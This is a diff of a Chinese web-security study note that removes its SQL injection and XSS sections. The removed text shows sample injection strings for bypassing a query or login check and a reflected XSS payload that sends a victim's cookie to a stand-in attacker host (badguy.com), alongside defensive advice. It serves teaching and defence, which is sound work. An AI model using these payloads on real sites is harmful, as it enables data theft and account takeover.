@@ -8,66 +8,7 @@
 > 如果协议、端口和主机相同则认为是同源。
 
 ##sql注入
-> sql注入就是通过前端的请求将sql片段作为参数传入到后台，后台通过参数拼接出非预定sql
-> 最终达到欺骗服务器执行恶意sql命令；
 
-	例如下面这个请求
-	order/list?id=100
-	在服务器端会进行如下查询并返回结果
-	SELECT * FROM orders WHERE id='100'
-	我们的对请求地址做一个修改
-	order/list?id=100'or'1'='1'
-	那么执行的sql就变成了这个样子
-	SELECT * FROM orders WHERE id='100' or '1'='1'
-	所以全部数据都拿到了
-
-	例如登录验证
-	SELECT * FROM users where name='lee' and pwd='123456' and code='1234';
-	我们随便输入一个用户名、密码留空，验证码输入 'or 1=1--
-	SELECT * FROM users where name="xxx" and pwd="and code=" or 1=1--';
-	这样随意输入一个用户名都可以登录成功
-
-> sql注入的应对
-
-1. 永远不要相信用户的输入
-2. 也不要相信客户端的验证
-3. 错误信息处理，不要把服务端的错误信息透露给用户
-4. 不要使用管理员权限连接数据库
-5. 敏感信息不要明文存储，要加密保存
-
-
-##XSS
-> 跨域脚本攻击(cross-site scripting)
-> 主要用于获取用户信息
-> 攻击原理是将用户的输入转化为了代码
-
-攻击场景一 Dom-Based XSS
-
-	// http://victim.com网站 后台代码
-	<html>
-	　　<title></title>
-	　　<body>
-	　　　　Results  for  <%Reequest.QueryString("term")%>
-	　　　　...
-	　　</body>
-	</html>
-	// 攻击
-	// step1 建立后台用来偷取用户信息
-	http://badguy.com
-	// step2 发送恶意链接，可以通过邮件 qq等
-	http://victim.com/search.asp?term=<script>window.open("http://badguy.com?cookie="+document.cookie)</script>
-	// 这时只要用户点击这个连接，那么生成的页面中就包含可以指向的代码片段
-	<script>window.open("http://badguy.com?cookie="+document.cookie)</script>
-	// 这个代码自动运行把用户的cookie发送到了攻击者的网站
-
-
-> 预防策略是对用户的输入做`encode`处理，将其中的`<`、`>`、`'`、`"`、`;`之类的特殊字符进行编码
-
-1. 将重要的cookie标记为http only,   这样的话Javascript 中的document.cookie语句就不能获取到cookie了.
-2. 只允许用户输入我们期望的数据。 例如：　年龄的textbox中，只允许用户输入数字。 而数字之外的字符都过滤掉。
-3. 对数据进行Html Encode 处理
-4. 过滤或移除特殊的Html标签， 例如: <script>, <iframe> ,  &lt; for <, &gt; for >, &quot for
-5. 过滤JavaScript 事件的标签。例如 "onclick=", "onfocus" 等等。
 
 
 ##CSRF
@@ -93,5 +34,4 @@
 
 
 ##参考文献
-[Web安全测试之XSS](http://www.cnblogs.com/TankXiao/archive/2012/03/21/2337194.html)
 [浅谈WEB安全性（前端向）](http://www.2cto.com/Article/201412/363743.html)
